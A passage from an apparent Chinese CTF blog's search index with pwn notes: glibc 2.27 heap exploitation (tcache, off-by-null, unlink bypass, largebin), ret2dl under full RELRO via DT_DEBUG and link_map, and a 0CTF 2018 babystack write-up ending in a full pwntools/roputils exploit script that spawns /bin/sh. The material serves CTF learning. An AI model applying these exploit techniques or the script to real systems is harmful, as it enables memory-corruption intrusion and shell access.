src="https://img-blog.csdnimg.cn/20210715135831417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>直接调试下的heap</p><p><img src="https://img-blog.csdnimg.cn/20210715135852934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我怀疑是gdb的配置出了点什么毛病，这个ubuntu18环境是我之前随便装的，没怎么管。</p><p>解决方案：</p><p>1：暂无</p><p>2 : 无视问题，摁调。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="2-1-Tcache的安全问题"><a href="#2-1-Tcache的安全问题" class="headerlink" title="2.1-Tcache的安全问题"></a>2.1-Tcache的安全问题</h3><p>2.27版本下相对于2.23新增了tcache机制。</p><p>Tcache为每一个线程创建缓存，即内含一些堆块，每个线程分配64个bins，一个bins最多存7个chunk，64位下chunk的大小以16字节递增，也就是最大1032b，所以Tcache并不能存放large bin。，</p><p>释放堆块时，如果chunk大小符合要求就放入Tcache，直到Tcache被填满，这个操作是优先于fastbin或者其他操作的。</p><p>分配堆块时，如果从fastbin返回了一个合适的chunk，那么fastbin中的其他chunk都会被放入Tcache（除非被装满），smallbin同理。</p><p>以及，分配堆块时，如果Tcache中有合适的chunk，就从其中取出来，这也是优先于其他bin的。</p><p>可以看出Tcache的优先级比较高，这就导致很多有效的检测将被跳过，在提升执行效率的同时也大大提升了安全风险。</p><p>虽然但是，本题的2.27版本不涉及Tcache的安全漏洞利用。只需要将tcache填满就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">248</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>    free（i）<br></code></pre></td></tr></table></figure><p>Ps:每个size的Tcache最多有7个，也就是连续申请7个0xf8的chunk再释放就能把tcache填满。</p><h3 id="2-2-chunk的size的内存对齐问题"><a href="#2-2-chunk的size的内存对齐问题" class="headerlink" title="2.2-chunk的size的内存对齐问题"></a>2.2-chunk的size的内存对齐问题</h3><p>题目中我们申请了四个size为0xF8的chunk 申请后的heap信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Allocated chunk | PREV_INUSE<span class="hljs-comment">#截取了chunk0的信息，地址问题承接上文。</span><br>Addr: 0x1b39250<br>Size: 0x21<br><br>Allocated chunk | PREV_INUSE<br>Addr: 0x1b39270<br>Size: 0x101<br>----------------------------------------------------------------<br>pwndbg&gt; x/50gx 0x1b39250<br>0x1b39250:0x00000000000000000x0000000000000021<br>0x1b39260:0x0000000001b392800x0000000000000000<br>0x1b39270:0x00000000000000000x0000000000000101<br>0x1b39280:0x0000000a616161610x0000000000000000<br>0x1b39290:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure><p>可以看到没有什么太大的差错。</p><p>然而针对实际情况，我们提出两个问题。</p><p>1）为什么0xf8实际是0x101？</p><p>0xF8 + 0x8 = 0x100（ps：101中的最低位的1是prev inuse位）</p><p>也就是实际比我们申请的多了八个字节。</p><p>那么是不是我们申请的每个堆块的实际大小都会比原来多0x8呢？</p><p>具体来试一试。这次我们申请0xf0大小的chunk。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Allocated chunk | PREV_INUSE<br>Addr: 0x908270<br>Size: 0x101<span class="hljs-comment">#chunk的size还是0x101，相当于这次增加了0x16</span><br></code></pre></td></tr></table></figure><p>注意到两个值一个16字节对齐，另一个是16的倍数再加了八字节。</p><p>事实上就是malloc的对齐机制。机制比较完善的编译器会为我们malloc的chunksize自动对进行内存对齐。比如说malloc 0x15的chunk，内存中就是0x21。0x21的来源就是malloc自动为0x15进行内存对齐。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x12a5270:0x00000000000000000x0000000000000021<br>0x12a5280:0x0000000a616161610x0000000000000000<br></code></pre></td></tr></table></figure><p>回到问题本身，那为什么我们要专门申请16+8的size呢？</p><p>众所周知，ptmalloc中有一个神奇的节约内存空间的内存复用机制：</p><p>众众所周知，malloc规定，只有当本chunk的前一个chunk为free状态的时候，本chunk的prev size才是有意义的，如果本chunk的前一个chunk处于allocated状态，那么即不使用本chunk的prev size。</p><p>基于这种规定，当处于alocated状态的prev chunk越来越多，势必会造成一些浪费，所以malloc又规定，如果本chunk申请时size大小是16的倍数，那么就在它前面增加prev size位和size位，如果是16x+8的形式，那么只在chunk前增加size位，prev size位则储存在prev chunk的最后八位。也就是我们一开始碰见的情况。</p><p>因此我们要对chunk进行off by null，那么它的prev size位肯定是要可控制的，所以这里我们就需要申请16+8，将prev size分配到上一个chunk中供我们篡改。</p><p>2）chunk的size大小问题，有很多size供我们选择，为什么偏偏要是0xf8？</p><p>解决了第一个问题，第二个问题其实很好解释。首先前文说到的，要空字节溢出，size就不能太小。其次size是16的倍数+8。满足了这两个条件只要不是大得离谱（别跑去large bin或者mmap了），随便啥size都可以，但是太大也不好掌控还浪费空间。</p><h3 id="2-3-unlink？"><a href="#2-3-unlink？" class="headerlink" title="2.3-unlink？"></a>2.3-unlink？</h3><p>不管是2.23还是2.27，unlink最终目标都是通过堆叠来修改chunk指针的内容。</p><p>那为什么是unlink，而不是其他方法？</p><p>首先来回顾一下unlink的利用过程。</p><p>在有检测的情况下，绕过检测是利用unlink的较为关键的一步。</p><p>检测使得我们不能直接修改next chunk 的fd 和bk后进行unlink。绕过的方式也有。fd和bk只要满足以下条件，则会触发target chunk的unlink。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fakeFD -&gt; bk == P` ，等价于 `*(fakeFD + <span class="hljs-number">12</span>) == P<br>fakeBK -&gt; fd == P`` ，等价于`*(fakeBK + <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure><!--0x12和0x8的来源参考chunk的结构。--><p>触发后，操作如下</p><ul><li><p><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></p></li><li><p><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></p><p>如果<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code></p><p>那么也就是</p><p><code>*P = P - 12</code></p></li></ul><p>这样p的地址就向下偏移了0x12个字节。</p><p>设置<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code>的方法也很简单，只需要<code>fake_fd = nextchunkptr - 0x12，fake_ bk = nextchunk -0x8</code>就行。</p><p>虽然这样大费周章也只是让p地址下移了12，但是这0x12字节足够我们构造堆叠了。</p><p>ps：可以类比数学证明题来理解这段绕过的分析思路。从使检测成立的结果一步步逆推，这里使用的就是”根据结果推原因”，属于“分析法”</p><h3 id="2-4-largebin"><a href="#2-4-largebin" class="headerlink" title="2.4-largebin"></a>2.4-largebin</h3><p><del>其实了解large bin或者largebin attack前还需要了解unsortedbin，但是unsortedbin感觉不是重点。</del></p><p>稍微介绍本题中关于largebin chunk的一些比较关键的数据构。</p><p>为了加快检索速度，largebin链表增加了fd_nextsize,bk_nextsize指针，用于指向第一个与自己大小不同的chunk（所以只有当largebin中有两个大小不同的chunk时，这两个指针才会被修改)。如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己。</p><p>largebin中的chunk大致结构如下</p><p><img src="https://img-blog.csdnimg.cn/20210715135936538.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    
    <tags>
      
      <tag>mess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dl_advanced</title>
    <link href="/2021/08/02/ret2dl_advanced/"/>
    <url>/2021/08/02/ret2dl_advanced/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="ret2dl-advanced"><a href="#ret2dl-advanced" class="headerlink" title="ret2dl_advanced"></a>ret2dl_advanced</h2><h3 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p><p>但是我们仍然能够找到某种方式来getshell。</p><p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p><p>(Ps:为什么找不到相关的中文文章)</p><h3 id="2）dt-dbg？"><a href="#2）dt-dbg？" class="headerlink" title="2）dt_dbg？"></a>2）dt_dbg？</h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p><p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p><p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p><p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p><p><code>r_debug</code>具体代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_debug</span></span><br><span class="hljs-class">  &#123;</span> <br>    <span class="hljs-keyword">int</span> r_version;              <span class="hljs-comment">/* Version number for this protocol. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">r_map</span>;</span>     <span class="hljs-comment">/* Head of the chain of loaded objects. */</span><br><br>    <span class="hljs-comment">/* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */</span><br>    ElfW(Addr) r_brk;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">      &#123;</span> <br>        <span class="hljs-comment">/* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */</span><br>        RT_CONSISTENT,          <span class="hljs-comment">/* Mapping change is complete. */</span><br>        RT_ADD,                 <span class="hljs-comment">/* Beginning to add a new object. */</span><br>        RT_DELETE               <span class="hljs-comment">/* Beginning to remove an object mapping. */</span><br>      &#125; r_state;<br><br>    ElfW(Addr) r_ldbase;        <span class="hljs-comment">/* Base address the linker is loaded at. */</span><br>  &#125;;<br></code></pre></td></tr></table></figure><p>实操一遍</p><p>随便写一个无output的栈溢出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">fur1n@ubuntu:~/pwn$ readelf -d ret2dl<br><br>Dynamic section at offset 0xdb8 contains 27 entries:<br>  Tag        Type                         Name/Value<br>...<br> 0x0000000000000015 (DEBUG)              0x0<br><br><br></code></pre></td></tr></table></figure><p>在没有运行的时候<code>dt_dbg</code>为空。</p><p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p><p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p><p>段的地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/50gx 0x600e20<br>...<br>0x600ee0:0x00000000000000150x00007ffff7ffe140<br></code></pre></td></tr></table></figure><p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe140<br>0x7ffff7ffe140 &lt;_r_debug&gt;:0x00000000000000010x00007ffff7ffe170<br>0x7ffff7ffe150 &lt;_r_debug+16&gt;:0x00007ffff7de3f400x0000000000000000<br>0x7ffff7ffe160 &lt;_r_debug+32&gt;:0x00007ffff7dd30000x0000000000000000<br>0x7ffff7ffe170:0x00000000000000000x00007ffff7ffe700<br>0x7ffff7ffe180:0x0000000000600e200x00007ffff7ffe710<br>0x7ffff7ffe190:0x00000000000000000x00007ffff7ffe170<br>0x7ffff7ffe1a0:0x00000000000000000x00007ffff7ffe6e8<br>0x7ffff7ffe1b0:0x00000000000000000x0000000000600e20<br>0x7ffff7ffe1c0:0x0000000000600f000x0000000000600ef0<br>0x7ffff7ffe1d0:0x00000000000000000x0000000000600ea0<br><br></code></pre></td></tr></table></figure><p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x7ffff7ffe140 &lt;_r_debug&gt;:0x00000000000000010x00007ffff7ffe170<br></code></pre></td></tr></table></figure><p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p><p>虽然但是。</p><p>只是找到<code>link_map</code>没啥用。</p><p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p><p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p><p>那么如何寻找呢？</p><p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p><p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p><p><code>dl_runtime_resolve</code>。</p><p>首先我们找到<code>libc.so.6</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe170<br>0x7ffff7ffe170:0x00000000000000000x00007ffff7ffe700<br>0x7ffff7ffe180:0x0000000000600e200x00007ffff7ffe710<br>---<br>pwndbg&gt; x/20gx 0x00007ffff7ffe700<br>0x7ffff7ffe700:0x00000000000000000x0000000000000000<br>0x7ffff7ffe710:0x00007ffff7ffb0000x00007ffff7ffebb0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffebb0<br>0x7ffff7ffebb0:<span class="hljs-string">&quot;linux-vdso.so.1&quot;</span><br>---<br>pwndbg&gt; x/10gx 0x00007ffff7ffe710<br>0x7ffff7ffe710:0x00007ffff7ffb0000x00007ffff7ffebb0<br>0x7ffff7ffe720:0x00007ffff7ffb3a00x00007ffff7fe2000<br>---<br>pwndbg&gt; x/10gx 0x00007ffff7fe2000<br>0x7ffff7fe2000:0x00007ffff79e20000x00007ffff7ffedd0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffedd0<br>0x7ffff7ffedd0:<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br><br></code></pre></td></tr></table></figure><p>即<code>0x00007ffff7ffedd0</code>。</p><p>0x3即<code>GOT[]</code>入口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/30gx 0x00007ffff7dccb80<br>...<br>0x7ffff7dccc30:0x00000000000000030x00007ffff7dcd000<br><br></code></pre></td></tr></table></figure><p>找到GOT[3]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/5gx 0x00007ffff7dcd000<br>0x7ffff7dcd000:0x00000000003eab800x00007ffff7fe2000<br>0x7ffff7dcd010:0x00007ffff7dea8f00x00007ffff7b70a10<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; xinfo 0x00007ffff7dea8f0<br>Extended information <span class="hljs-keyword">for</span> virtual address 0x7ffff7dea8f0:<br><br>  Containing mapping:<br>    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so<br><br>  Offset information:<br>         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0<br><br> Containing ELF sections:<br>               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0<br><br></code></pre></td></tr></table></figure><h3 id="3）exploitation"><a href="#3）exploitation" class="headerlink" title="3）exploitation"></a>3）exploitation</h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p><p>有aslr的情况。。</p><p>我也不会。</p><h3 id="4-refrence"><a href="#4-refrence" class="headerlink" title="4)refrence"></a>4)refrence</h3><p><a href="http://rk700.github.io/2015/04/09/dt_debug-read/">通过DT_DEBUG来获得各个库的基址</a></p><p><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico">How the ELF Ruined Christmas</a></p><p><a href="https://ypl.coffee/dl-resolve-full-relro/">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p><p>————————————————tbc——————————————————-</p>]]></content>
    
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0CTF_2018_babystack</title>
    <link href="/2021/08/02/0CTF2018-babystack/"/>
    <url>/2021/08/02/0CTF2018-babystack/</url>
    
    <content type="html"><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>作为ret2dl的复习题。</p><h2 id="2）exploitation"><a href="#2）exploitation" class="headerlink" title="2）exploitation"></a>2）exploitation</h2><p>溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。</p><p>并且没有aslr，relro为partial。</p><p>非常典型的ret2dl。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>可以直接用roputils做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> roputils<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>offset = <span class="hljs-number">44</span><br>readplt = <span class="hljs-number">0x08048300</span><br>bss = <span class="hljs-number">0x0804a020</span><br>vulFunc = <span class="hljs-number">0x0804843B</span><br><br>p = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getReloc</span>(<span class="hljs-params">elf, base</span>):</span><br>    jmprel = elf.dynamic(<span class="hljs-string">&#x27;JMPREL&#x27;</span>)<br>    relent = elf.dynamic(<span class="hljs-string">&#x27;RELENT&#x27;</span>)<br><br>    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)<br>    reloc_offset = addr_reloc - jmprel<br>    <span class="hljs-keyword">return</span> reloc_offset<br><br>rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)<br><br><span class="hljs-comment"># step1 : write sh &amp; resolve struct to bss</span><br>buf1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset <span class="hljs-comment">#44</span><br>buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="hljs-number">0</span>) + p32(addr_bss) + p32(<span class="hljs-number">100</span>)<br>p.send(buf1)<br><br>buf2 =  rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">20</span>, buf2)<br>buf2 += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">100</span>, buf2)<br>p.send(buf2)<br><br><span class="hljs-comment">#step2 : use dl_resolve_call get system &amp; system(&#x27;/bin/sh&#x27;)</span><br>buf3 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span> + rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)<br>p.send(buf3)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
